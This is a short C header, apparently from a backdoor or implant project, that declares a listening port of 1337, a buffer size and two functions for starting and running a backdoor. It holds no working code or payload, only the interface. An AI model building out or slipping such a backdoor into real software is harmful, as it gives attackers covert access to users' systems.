#ifndef BACKDOOR_H
#define BACKDOOR_H
#define BKDOOR_PORT 1337
#define BKDOOR_BUF_SIZE 512

int backdoor_run(void *);
int backdoor_start(void);
#endif
